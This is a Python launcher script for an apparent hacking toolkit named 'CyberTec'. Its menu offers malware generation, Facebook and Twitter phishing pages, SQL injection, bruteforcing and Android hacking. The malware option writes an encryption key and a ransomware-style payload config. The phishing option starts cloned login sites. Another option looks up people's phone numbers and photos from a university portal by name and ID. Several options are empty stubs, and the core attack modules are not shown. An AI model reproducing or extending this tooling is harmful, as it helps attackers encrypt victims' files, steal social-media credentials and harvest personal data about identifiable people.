import subprocess
# from exploit.exploitor import cyberRun
# from exploit.scanner import cyberScan
import phishing.phishing as phishing
# from password.service_bypass import cyberPass
from scraping.aau import AAU
import malware.malware as malware
from cryptography.fernet import Fernet

subprocess.run(['sudo'])

class bcolors:
    GREEN = '\u001b[38;5;83m'
    YELLOW = '\033[93m' 
    RED = '\u001b[38;5;1m'
    RESET = '\033[0m'
    Blue= '\u001b[38;5;33m'
    Yellow= '\u001b[38;5;226m'
    Purple= '\u001b[38;5;129m'
    Orange= '\u001b[38;5;208m'
    Cyan= '\u001b[38;5;45m'
    Pink= '\u001b[38;5;211m'
    Brown= '\u001b[38;5;94m'
    Gray='\u001b[38;5;245m'
    Black= '\u001b[38;5;0m'
    White= '\u001b[38;5;15m'
malware.clear()
bcolors.Gray
malware.arting()
bcolors.RESET
_name="""
  #####                                 #######               
 #     #  #   #  #####   ######  #####     #    ######  ####  
 #         # #   #    #  #       #    #    #    #      #    # 
 #          #    #####   #####   #    #    #    #####  #      
 #          #    #    #  #       #####     #    #      #      
 #     #    #    #    #  #       #   #     #    #      #    # 
  #####     #    #####   ######  #    #    #    ######  ####  
                                                          """
print(bcolors.Cyan+f'\n Welcome to \n\t\t{_name}  \n')
while(True):
         inp=input(f"""\n{bcolors.GREEN} \t\t\tChoose what to do {bcolors.RESET}
      
         \t\t[{bcolors.RED}1{bcolors.RESET}]: Generate Malware
         \t\t[{bcolors.RED}2{bcolors.RESET}]: Phising
         \t\t[{bcolors.RED}3{bcolors.RESET}]: Web bruteforcing
         \t\t[{bcolors.RED}4{bcolors.RESET}]: Automate Sql injection
         \t\t[{bcolors.RED}5{bcolors.RESET}]: AAU Web Scraping 
         \t\t[{bcolors.RED}6{bcolors.RESET}]: Port Scanner
         \t\t[{bcolors.RED}7{bcolors.RESET}]: Exploitation
         \t\t[{bcolors.RED}8{bcolors.RESET}]: Android Hacking


         \t\t[{bcolors.RED}9{bcolors.RESET}]: {bcolors.RED}Exit{bcolors.RESET}
         
         """)
         if int(inp)==1:
                    malware.clear()
                    print(_name)
                    path,ignored,limited,key=malware.home()
                    print(f"path {path} ignored{ignored} limitted {limited} key {key}")
                    key=Fernet.generate_key()
                    with open("key.txt", 'w') as keyfile:
                       keyfile.write(f"{key}")
                    print(f'your key is created in key.txt')
                    payload=[path,ignored,limited,key]
                    file=open('./malware/payloads.py','w')
                    file.write(f"from math import inf\npayload={payload}")
                    print(bcolors.GREEN +f'Malware successfully created' +bcolors.RESET)
                    break
         elif int(inp)==2:
                    malware.clear()
                    print(_name)
                    phishing.settingUp()
                    while(True):
                         inp=input(f"""\n{bcolors.GREEN} \t\t\tChoose the phishing site{bcolors.RESET}
                      
                         \t\t[{bcolors.RED}1{bcolors.RESET}]: Facebook
                         \t\t[{bcolors.RED}2{bcolors.RESET}]: Twitter
                   
                
                
                
                         \t\t[{bcolors.RED}3{bcolors.RESET}]: Back
                         \t\t[{bcolors.RED}4{bcolors.RESET}]: Exit
                         
                         """)
                         if int(inp)==1:
                                
                                    phishing.conf('fb')
                                    break
                         elif int(inp)==2:
                             
                                    phishing.conf('tw')                    
                                    break
                
                         elif int(inp)==3:
                                     phishing.closingUp()
                                     malware.clear()

                                     break
                         elif int(inp)==4:
                                    print(bcolors.Pink+ "Exiting...")
                                    phishing.closingUp()
                                    malware.clear()
                                    exit()
                                    
                         else:
                                     print(bcolors.RED+"\n\tWrong input Number" + bcolors.RESET)
                    
                    
                    

         elif int(inp)==3:
                    
                     break
         elif int(inp)==4:
                    
                     break
         elif int(inp)==5:
                     while True:
                         fname=input("\nfirst name :")
                         lname=input('father name: ')
                         ugr=input('id :')
                         user=AAU(fname,lname,ugr)
                         print(user.phone())
                         try:
                            user.photo()
                         except:
                                 print("try again")
                                 break
                             
                    
                     break
         elif int(inp)==6:
                    
                     break
         elif int(inp)==7:
                    
                     break
         elif int(inp)==8:
                    
                     break
         elif int(inp)==9:
                    print(bcolors.Pink+ "Exiting...")
                 
                    exit()
                    
         else:
                     print(bcolors.RED+"\n\tWrong input Number" + bcolors.RESET)
                    


